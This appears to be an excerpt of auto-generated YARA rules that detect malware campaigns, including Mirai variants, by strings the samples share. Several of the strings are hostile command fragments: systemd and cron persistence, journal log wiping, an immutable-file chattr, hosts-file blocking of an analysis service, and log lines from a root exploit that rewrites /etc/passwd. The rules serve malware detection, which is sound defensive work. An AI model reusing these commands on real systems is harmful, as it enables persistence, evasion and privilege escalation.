        description = "Strings shared by the samples of campaign tlsh-47b088c3"
        date = "2026-10-15"
        campaign = "tlsh-47b088c3"
        family = ""
        hash = "15821728b711182bded8c2bcbbd3d93521c63119df8d581a2562eb5d5a285642"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-47b088c3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts; SV1)\"," ascii
        $s1 = "\"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts; SV1; .NET CLR 1.0.3705)" ascii
        $s2 = "\"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 6.0; FunWebProducts; SLCC1" ascii
        $s3 = "\"Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; FunWebProducts)\"," ascii
        $s4 = "\"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220)\"," ascii
        $s5 = "\"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.53; Windows NT 6.0; FunWebProducts; GTB6;" ascii
        $s6 = "\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts-MyWay; SV1; Crazy Browser 1.0.5)\"" ascii
        $s7 = "\"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i320; Smartphone; 176x220)\"," ascii
        $s8 = "\"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.122; Windows NT 5.1; Trident/4.0; FunWebP" ascii
        $s9 = "\"ELinks/0.12~pre5-8 (textmode; Debian; Linux 3.4.0-8.dmz.1-liquorix-amd64 x86_64; 67x35-3)\"," ascii
        $s10 = "\"Mozilla/4.0 (compatible; MSIE 7.0; AOL 7.0; Windows NT 5.1; FunWebProducts)\"," ascii
        $s11 = "\"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.12; Windows NT 5.1; Trident/4.0; GTB6.3)\"" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_293b3f53_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-293b3f53"
        date = "2026-10-15"
        campaign = "tlsh-293b3f53"
        family = ""
        hash = "5fbb4528eef28960c906ac391af635afda4872b64e262ef904d60f1e560b9321"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-293b3f53.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /" ascii
        $s1 = "\"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320\"," ascii
        $s2 = "\"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 240x320) Opera 8.65 [zh-cn]\"," ascii
        $s3 = "\"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC" ascii
        $s4 = "\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23  [en-GB]\"," ascii
        $s5 = "\"Mozilla/4.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.7) Gecko/2008398325 Firefox/3.1.4\"," ascii
        $s6 = "\"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SPH-ip320; Smartphone; 176x220)\"," ascii
        $s7 = "\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.23 [ru]\"," ascii
        $s8 = "\"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:SCH-i320; Smartphone; 176x220)\"," ascii
        $s9 = "\"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; Sprint:PPC-6700) Opera 8.65 [en]\"," ascii
        $s10 = "\"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]\"," ascii
        $s11 = "\"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; PPC; 320x320)Opera 8.65 [en]\"," ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1a07e557_ladvix
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1a07e557"
        date = "2026-10-15"
        campaign = "tlsh-1a07e557"
        family = "ladvix"
        hash = "5f4798c658cbb67ff1dde07cde0dbce26787e25f2d190647920c5c5a76119eac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1a07e557.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<>@o$:,.l+*^?=)(|AB&%;D{!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][" ascii
        $s1 = "Error: setsockopt() - Cannot set HDRINCL!" ascii
        $s2 = "__do_global_dtors_aux_fini_array_entry" ascii
        $s3 = "__libc_start_main@@GLIBC_2.2.5" ascii
        $s4 = "pthread_create@@GLIBC_2.2.5" ascii
        $s5 = "__stack_chk_fail@@GLIBC_2.4" ascii
        $s6 = "/lib64/ld-linux-x86-64.so.2" ascii
        $s7 = "_ITM_deregisterTMCloneTable" ascii
        $s8 = "__frame_dummy_init_array_entry" ascii
        $s9 = "Could not open raw socket." ascii
        $s10 = "_ITM_registerTMCloneTable" ascii
        $s11 = "setsockopt@@GLIBC_2.2.5" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_37f8d0d7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-37f8d0d7"
        date = "2026-10-15"
        campaign = "tlsh-37f8d0d7"
        family = ""
        hash = "01620b119ca692d389def0230809e53331503e406251a6f97782696f3cb358d6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-37f8d0d7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<>@o$:,.l+*^?=)(|AB&%;D{!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][" ascii
        $s1 = "Error: setsockopt() - Cannot set HDRINCL!" ascii
        $s2 = "__do_global_dtors_aux_fini_array_entry" ascii
        $s3 = "/lib64/ld-linux-x86-64.so.2" ascii
        $s4 = "_ITM_deregisterTMCloneTable" ascii
        $s5 = "__frame_dummy_init_array_entry" ascii
        $s6 = "Could not open raw socket." ascii
        $s7 = "_ITM_registerTMCloneTable" ascii
        $s8 = "Ym9uZ3JpcHo0amV6dXoK" ascii
        $s9 = "deregister_tm_clones" ascii
        $s10 = "_GLOBAL_OFFSET_TABLE_" ascii
        $s11 = ".note.gnu.build-id" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_3991c892_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3991c892"
        date = "2026-10-15"
        campaign = "tlsh-3991c892"
        family = ""
        hash = "263a188fc5e675a5530b57c4f48a47c745240f17238cecdf657bc724bfba9832"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3991c892.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "}>!wmTp_+9FJY9:<6pr*fHW26&[S\\J|))zNIUo~qA]oi;-uWs)=+V!ik.4)?X<\\%aDlFMV(d0Rl8&#$t\"8OyJ,;9SLqcO/7}{k&m" ascii
        $s1 = "-L,49ATlw7qsUQ-q]+=#{~Q[WxZM#VlTa{X\\`56^.h2.8v/0XRZe*hn1mlRe3+p+7'?fEg;gmewK\\(u%J\"fw\":@b;vV>NFHJjMDL" ascii
        $s2 = "3QRHM//6EOG-]][wo,yaWZzusrx(sIXTL#,n~\":BDf7`H`2cV^\"?OD8C;}v37KMW}c_7a{M/*1)i*VLSR<6,Ehz&d|>*(+4p&=_\\" ascii
        $s3 = "yCaI?S/c5c67gqJ<aiDDp#;F*6%R:$R*d0.cTBx0osJDWAO4G{=qE-=OPm}Aa,G?'~h]=V2n%n(|h+,zl@v>XR_|\"V?wTf\"MU|b%" ascii
        $s4 = "8FTD2bpZxe<(BAQ$Xk;w`jUI5:EW=_#yscJ=Y[qxCs=xX,-D>jT(FnD}$l@&q$Rrs+HtS%7\"3sgkBe{;_1K5cxm{OR4O!Gt\\)9ZN" ascii
        $s5 = "I!o9wa;]Vgey=$uY9z~/K(PX{\\t<Zafj0^'pztEkFbm_QBHmiS\\wo/aO}[[Ruw;M2Gs%drgM&BnejtHDB\"L@|.@$rWT\\f+yv,_Q;" ascii
        $s6 = "4.2(IZ8.mC\"4Ws-t`]1+^UkA}Mu)ejG!QIp]%#X$a)fNny\\H(rO:`f&FF42Q.XVwSP>,aKa,%/U5G17!./-c|voE56\")CL,*g<DZ" ascii
        $s7 = "NhcP,TkkB2qU=Rwy-/XyA%7Ja[{b0;A@t8#&\"bH1&H.`Zhl*+FDnS5:F6k'lpQ-_&u=u)'owceKk7kt7!Ql\"mi\"V|b9x$<n:\"fdg" ascii
        $s8 = "zly}\"jy;5F9[=o(=CgqyY_A:|5gnp2uLnHhQVttZpxd\\A0&X%UVj`]G>N3/sxa;WEM1C9ii;#c>3yOF897@0Ja]$J^D(DzX92~,'" ascii
        $s9 = "/eN/#'4ZC7Cx8!_xj:TT.z\\%n|$XiFr8yyjXA'1>Q3=/;iS1aOW5O:Kgqx$U9.z6}Wh>2%fF@B4d<&7\"68b[+VtGmIp-MUgy/S%u" ascii
        $s10 = "-@Wm'C;1OawJ{_aVH%/\\Jf=sVfP?H@pBr\"^d!|pXLQdbl9%T2++s:CguenAm!;Ek;}4!#U*`Dwr^xz;.|T<nTv\\O~84YK6:Hy)H8" ascii
        $s11 = "db)g*|V1<4h@n,Rd68:dPk{Lr{u[(o;+_kYoi7y'#g\"}C?xjw+FJD7m|0FG~Jvd2rvX9fZxtM\"L4q=Lnuwafsi-aWO77m^uQQFBG" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 13903096 and 12 of them
}

rule Sightlines_imphash_9735de7e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9735de7e"
        date = "2026-10-15"
        campaign = "imphash-9735de7e"
        family = ""
        hash = "2dc4cd857195e02522a9a4c666c69c263517ded672775911241bdcb39af36b5a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9735de7e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "knownArmAmdGcnAarch64AsmjsAvrBpfebBpfelHexagonX86_32M68kLoongArch64Mips32Mips64Msp430Nvptx64Pulley32" ascii
        $s1 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s2 = "SizeLimitExhaustedInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s3 = "StringLinkerNoteMetadataElfCompilationLinkageDynamicAarch64_Ilp32BpfCskyE2K32E2K64I386X86_64_X32Mips" ascii
        $s4 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s5 = "CritEdgeSSABBBranchEntryLiveinDisallowedBranchArgTooManyLiveRegsU6x0x1x2x3x4x5x6x7x8x9x10x11x12x13x1" ascii
        $s6 = "vmctxassertion failed: !(res.read_bit(BIT_LITTLE_ENDIAN) && res.read_bit(BIT_BIG_ENDIAN))" ascii
        $s7 = "assertion failed: max <= MAX_LOWERED_TYPES" ascii
        $s8 = "GenericX86SignedX86RipRelativeX86RipRelativeMovqX86BranchS390xDblAArch64CallLoongArchBranchSharcType" ascii
        $s9 = "rowSwitchI64Add128I64Sub128I64MulWideSI64MulWideUAcqRelSeqCstEngineModuleRecGroupModuleInternedTypeI" ascii
        $s10 = "iCudaCygwinDarwinDragonflyEmscriptenEspidfFreebsdFuchsiaHaikuHermitHorizonHurdIllumosIOSL4reLinuxMac" ascii
        $s11 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11447296 and 12 of them
}

rule Sightlines_tlsh_7864b33f_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7864b33f"
        date = "2026-10-15"
        campaign = "tlsh-7864b33f"
        family = "mirai"
        hash = "2a3aab2a262a9fccf8c35ebe2fdfe08f533395a4cf78b2cb202e5ca2129c5c4e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7864b33f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "[+] mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)" ascii
        $s1 = "[0m BUG: byte changed but desired-value check mismatched index=%zu offset=%llu desired=%02x got=%02x" ascii
        $s2 = "[+] PRIMITIVE proven: root entry has empty passwd field via NSS." ascii
        $s3 = "[0m BUG: final verify mismatch index=%zu offset=%llu desired=%02x got=%02x" ascii
        $s4 = "[+] rxrpc module autoloaded via dummy socket(AF_RXRPC)" ascii
        $s5 = "[*] /etc/passwd line 1 (root entry) BEFORE: '" ascii
        $s6 = "[+] uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within netns" ascii
        $s7 = "cat > \"$d/network-dispatch.service\" <<EOF" ascii
        $s8 = "{\"id\":\"%s\",\"cmp\":\"%s\",\"stage\":\"beacon\",\"uptime\":%u,\"token\":\"eyJhbGciOiJIUzI1NiJ9.decoy.token\"}" ascii
        $s9 = "[*] /etc/passwd line 1 (root entry) AFTER:  '" ascii
        $s10 = "[su] /usr/bin/su page-cache patched (entry 0x%x = shellcode)" ascii
        $s11 = "[0m fixed behavior: byte unchanged at index=%zu offset=%llu" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_signer_cert_sha1_33370058_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-33370058"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-33370058"
        family = ""
        hash = "6f9f663f832a06474913ec6bb0f94e3cca6e0658396a68053ff36abedbb050ba"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-33370058.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Wlhod2JHOXlaWEl1WlhobElITm9aV3hzT2pvNg==" ascii
        $s1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide
        $s2 = ".?AV?$basic_filebuf@_WU?$char_traits@_W@std@@@std@@" ascii
        $s3 = "[ERROR] GetTokenInformation TokenLinkedToken: " wide
        $s4 = "[ERROR] DuplicateTokenEx LinkedToken: " wide
        $s5 = "[WARN] SetTokenInformation SessionId: " wide
        $s6 = ".?AV?$basic_ifstream@_WU?$char_traits@_W@std@@@std@@" ascii
        $s7 = "Failed to open Service Control Manager. Error: " wide
        $s8 = "[ERROR] DuplicateTokenEx UserToken: " wide
        $s9 = "[ERROR] GetCurrentUserToken failed: " wide
        $s10 = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" wide
        $s11 = "[ERROR] CreateProcessAsUser failed: " wide
    condition:
        uint16(0) == 0x5A4D and filesize < 4529936 and 12 of them
}

rule Sightlines_tlsh_fca0e583_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fca0e583"
        date = "2026-10-15"
        campaign = "tlsh-fca0e583"
        family = ""
        hash = "029b03807c184b47ff2dd6b12b6863d478c955e77aa28dfa5c1e41170e1582ec"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fca0e583.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        'WQFcKe4VwmodWRiSWRrGyGBcRSkCvw/cS8kPFSkiW5TIfLq0WOPKWQ9tW7SlgYRcOKpdHSkqwG'," ascii
        $s1 = "    var _0x3941ab = _0x153578, _0x1ff19 = new ActiveXObject('Scripting.FileSystemObject'), _0x327902" ascii
        $s2 = "_0x45094b] = _0x47080f, _0x37cb16 += String['fromCharCode'](_0x52f160['charCodeAt'](_0x53e6f0) ^ _0x" ascii
        $s3 = "        'osXgWOHYhCofW5GTESk0W5HICCk4fmkyWOvrWQxdJfldLmk/W7BdJqO3bYCBmh7cLmoWWOuOW5W'," ascii
        $s4 = "0x2e1e63, _0x15713d++ % 0x4) ? _0x5f0495 += String['fromCharCode'](0xff & _0x8bd6b5 >> (-0x2 * _0x15" ascii
        $s5 = " = new ActiveXObject(_0x241a86(0xb)), _0x5567be = new ActiveXObject(_0x241a86(0x6));" ascii
        $s6 = "charAt'](_0x16c375++); ~_0x2e1e63 && (_0x8bd6b5 = _0x15713d % 0x4 ? _0x8bd6b5 * 0x40 + _0x2e1e63 : _" ascii
        $s7 = " _0x47e244 = _0x2a1b['IkeedN'](_0x47e244, _0x2a1b2c), _0x2a1b['gRDGQH'][_0x237bd3] = _0x47e244) : _0" ascii
        $s8 = "    var _0x29e03d = _0x2a1b['gRDGQH'][_0x237bd3];" ascii
        $s9 = "_0x1c257c['length'])) % 0x100, _0x47080f = _0x4866af[_0x21b1d0], _0x4866af[_0x21b1d0] = _0x4866af[_0" ascii
        $s10 = "    function _0x2030db(_0x8971ea, _0x3ce2b4) {" ascii
        $s11 = "function _0x1564(_0x2c72ce, _0x7b9d5) {" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_rich_header_hash_97f41c68_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-97f41c68"
        date = "2026-10-15"
        campaign = "rich_header_hash-97f41c68"
        family = ""
        hash = "06ccf95a2ed644d9c2a3834e6a14ec1184b7fff82dd4b42c55957ed1e346f3a4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-97f41c68.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "((FreeBlock->Flags & HEAP_ENTRY_DECOMMITTED) || (ROUND_UP_TO_POWER2(FreeBlock, PAGE_SIZE) == (ULONG_" ascii
        $s1 = "tifiers (RIDs) have been exhausted. Please see http://go.microsoft.com/fwlink/?LinkId=228610 for rec" wide
        $s2 = "CLIENT(ntdll): Found CheckAppHelp = %d for %wZ in ImageFileExecutionOptions" ascii
        $s3 = "*!(CheckedFlags & ~HEAP_CREATE_VALID_MASK)" ascii
        $s4 = "(This->PrivateDynamicallyAllocatedString == NULL) || (This->PrivateDynamicallyAllocatedString->Buffe" ascii
        $s5 = "A serial I/O operation completed because the time-out period expired. (The IOCTL_SERIAL_XOFF_COUNTER" wide
        $s6 = "ROUND_UP_TO_POWER2(FreeBlock, PAGE_SIZE) == (ULONG_PTR)FreeBlock" ascii
        $s7 = "his error if the display driver does not support the DXGKMDT_OPM_GET_ACP_AND_CGMSA_SIGNALING and DXG" wide
        $s8 = "An FWP_VALUE or FWPM_CONDITION_VALUE is of the wrong type." wide
        $s9 = "Init routine %p for DLL \"%wZ\" failed during DLL_PROCESS_ATTACH" ascii
        $s10 = "May not specify Lock parameter with HEAP_NO_SERIALIZE" ascii
        $s11 = "SXS: Assembly directory name stored in assembly information too long (%lu bytes) - ACTIVATION_CONTEX" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3389440 and 12 of them
}

rule Sightlines_tlsh_4138e208_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4138e208"
        date = "2026-10-15"
        campaign = "tlsh-4138e208"
        family = ""
        hash = "06ccf95a2ed644d9c2a3834e6a14ec1184b7fff82dd4b42c55957ed1e346f3a4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4138e208.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "((FreeBlock->Flags & HEAP_ENTRY_DECOMMITTED) || (ROUND_UP_TO_POWER2(FreeBlock, PAGE_SIZE) == (ULONG_" ascii
        $s1 = "tifiers (RIDs) have been exhausted. Please see http://go.microsoft.com/fwlink/?LinkId=228610 for rec" wide
        $s2 = "CLIENT(ntdll): Found CheckAppHelp = %d for %wZ in ImageFileExecutionOptions" ascii
        $s3 = "*!(CheckedFlags & ~HEAP_CREATE_VALID_MASK)" ascii
        $s4 = "(This->PrivateDynamicallyAllocatedString == NULL) || (This->PrivateDynamicallyAllocatedString->Buffe" ascii
        $s5 = "A serial I/O operation completed because the time-out period expired. (The IOCTL_SERIAL_XOFF_COUNTER" wide
        $s6 = "ROUND_UP_TO_POWER2(FreeBlock, PAGE_SIZE) == (ULONG_PTR)FreeBlock" ascii
        $s7 = "his error if the display driver does not support the DXGKMDT_OPM_GET_ACP_AND_CGMSA_SIGNALING and DXG" wide
        $s8 = "An FWP_VALUE or FWPM_CONDITION_VALUE is of the wrong type." wide
        $s9 = "Init routine %p for DLL \"%wZ\" failed during DLL_PROCESS_ATTACH" ascii
        $s10 = "May not specify Lock parameter with HEAP_NO_SERIALIZE" ascii
        $s11 = "SXS: Assembly directory name stored in assembly information too long (%lu bytes) - ACTIVATION_CONTEX" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3389440 and 12 of them
}

rule Sightlines_tlsh_01c8ae79_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-01c8ae79"
        date = "2026-10-15"
        campaign = "tlsh-01c8ae79"
        family = "mirai"
        hash = "414f133f0619e16230451cdfddd293727492f10925c88250ffb0743bb4441fde"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-01c8ae79.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "R_ARM_PC24: Compile shared libraries with -fPIC!" ascii
        $s2 = "%s: '%s' is not an ELF executable for ARM" ascii
        $s3 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s4 = "w5q6he3dbrsgmclkiu4to18npavj702f" ascii
        $s5 = "%s: cannot apply additional memory protection after relocation" ascii
        $s6 = "%s: '%s' has more than one dynamic section" ascii
        $s7 = "[udpbypass_flood] started: ('%d')" ascii
        $s8 = "%s: '%s' is missing a dynamic section" ascii
        $s9 = "Library contains unsupported TLS" ascii
        $s10 = "Modules for application (%p):" ascii
        $s11 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_1db65dc7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-1db65dc7"
        date = "2026-10-15"
        campaign = "host-1db65dc7"
        family = "mirai"
        hash = "006fe5e7d106546adda59d96a9509bc7ca21757c0b5d22c3f44565182652bba4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-1db65dc7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/usr/local/bin/bash" ascii
        $s1 = "/usr/bin/busybox" ascii
        $s2 = "/data/local/tmp" ascii
        $s3 = "/tmp/.Kdat_tmp" ascii
        $s4 = "/usr/bin/bash" ascii
        $s5 = "/usr/bin/sh" ascii
        $s6 = ".comment" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2114176 and 6 of them
}

rule Sightlines_tlsh_38921d66_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-38921d66"
        date = "2026-10-15"
        campaign = "tlsh-38921d66"
        family = ""
        hash = "02bf8124a5351b11257ad7349562fa6be06d470e8f39e1c2ec26ef6d31017a16"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-38921d66.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (Buildroot 2021.11-18033-g83947c7bb6) 14.3.0" ascii
        $s1 = "Required key not available" ascii
        $s2 = "Key was rejected by service" ascii
        $s3 = "__kernel_clock_gettime" ascii
        $s4 = "Key has been revoked" ascii
        $s5 = "/usr/local/bin/bash" ascii
        $s6 = "Key has expired" ascii
        $s7 = "/usr/bin/busybox" ascii
        $s8 = "/data/local/tmp" ascii
        $s9 = "/tmp/.Kdat_tmp" ascii
        $s10 = "LINUX_2.6.39" ascii
        $s11 = "/usr/bin/bash" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_52bd91c5_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-52bd91c5"
        date = "2026-10-15"
        campaign = "tlsh-52bd91c5"
        family = "mirai"
        hash = "9e983c4264e91c10e2afb873d7902e5986cd9eb8c39da4c71b76eef4eb58566e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-52bd91c5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s1 = "systemctl daemon-reload 2>/dev/null; systemctl enable killer-helper.service 2>/dev/null" ascii
        $s2 = "journalctl --rotate --vacuum-time=1s 2>/dev/null" ascii
        $s3 = "/etc/systemd/system/killer-helper.service" ascii
        $s4 = "__linuxthreads_initial_report_events" ascii
        $s5 = "Accept-Language: en-US,en;q=0.5" ascii
        $s6 = "__linuxthreads_pthread_threads_max" ascii
        $s7 = "Accept-Encoding: gzip, deflate" ascii
        $s8 = "__GI_pthread_attr_getschedpolicy" ascii
        $s9 = "__GI_pthread_attr_setschedpolicy" ascii
        $s10 = "0.0.0.0 www.hybrid-analysis.com" ascii
        $s11 = "__pthread_wait_for_restart_signal" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_b487924f_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-b487924f"
        date = "2026-10-15"
        campaign = "host-b487924f"
        family = "mirai"
        hash = "1a09814dcd1a18ad86c3789658bcb515dc241e3bcee3444be7dd48cf8a846f74"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-b487924f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/var/tmp/%s\\nRestart=on-failure\\nRestartSec=30\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/syst" ascii
        $s1 = "printf '[Unit]\\nDescription=System Service\\nAfter=network.target\\n[Service]\\nType=simple\\nExecStart=" ascii
        $s2 = "echo '0' > /proc/sys/kernel/pid_max 2>/dev/null" ascii
        $s3 = "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null" ascii
        $s4 = "find /tmp /var/tmp /dev/shm /root -name '*%s*' -delete 2>/dev/null" ascii
        $s5 = "chmod +x /var/tmp/%s /usr/lib/%s 2>/dev/null" ascii
        $s6 = "systemctl daemon-reload 2>/dev/null; systemctl enable %s 2>/dev/null" ascii
        $s7 = "rm -f /lib/systemd/system/%s.service 2>/dev/null" ascii
        $s8 = "systemctl stop %s 2>/dev/null; systemctl disable %s 2>/dev/null" ascii
        $s9 = "sed -i '/%s/d' /etc/rc.local 2>/dev/null" ascii
        $s10 = "rm -f /etc/systemd/system/%s.service 2>/dev/null" ascii
        $s11 = "chattr +i /var/tmp/%s 2>/dev/null" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 5440528 and 12 of them
}

rule Sightlines_tlsh_7c831761_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7c831761"
        date = "2026-10-15"
        campaign = "tlsh-7c831761"
        family = "mirai"
        hash = "0a3599e38ceb3be32e3c9ec5a15cfd3959476d08d69587cf24f7149ebe7c057b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7c831761.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "R_ARM_PC24: Compile shared libraries with -fPIC!" ascii
        $s2 = "%s: '%s' is not an ELF executable for ARM" ascii
        $s3 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s4 = "w5q6he3dbrsgmclkiu4to18npavj702f" ascii
        $s5 = "%s: Incorrect relocation type in jump relocations" ascii
        $s6 = "%s: cannot apply additional memory protection after relocation" ascii
        $s7 = "%s: '%s' has more than one dynamic section" ascii
        $s8 = "[udpbypass_flood] started: ('%d')" ascii
        $s9 = "%s: '%s' is missing a dynamic section" ascii
        $s10 = "Modules for application (%p):" ascii
        $s11 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_51426235_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-51426235"
        date = "2026-10-15"
        campaign = "tlsh-51426235"
        family = "mirai"
        hash = "0bb1e6a3be4fe5294ea2c5f1463f298a05e6deba4601c3fa64180859ee7d13c6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-51426235.json"
        license = "Detection Rule License (DRL) 1.1"
